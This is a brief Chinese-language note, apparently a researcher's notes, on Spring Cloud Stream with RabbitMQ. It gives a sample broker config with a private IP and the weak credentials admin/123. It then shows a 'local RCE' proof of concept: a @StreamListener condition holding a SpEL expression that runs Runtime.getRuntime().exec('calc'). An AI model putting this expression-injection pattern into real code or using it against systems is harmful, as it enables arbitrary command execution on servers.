# Spring cloud stream

这个是一个消息中间件的问题

所以需要有RabbitMq这样的服务。

```
environment:
            spring:
              rabbitmq:
                host: 192.168.2.88
                port: 5672
                username: admin
                password: 123
```

consumer和produ都需要修改application.yml中的配置

## 本地RCE

```
@StreamListener(value = Sink.INPUT, condition = "T(Runtime).getRuntime().exec('calc')")
```
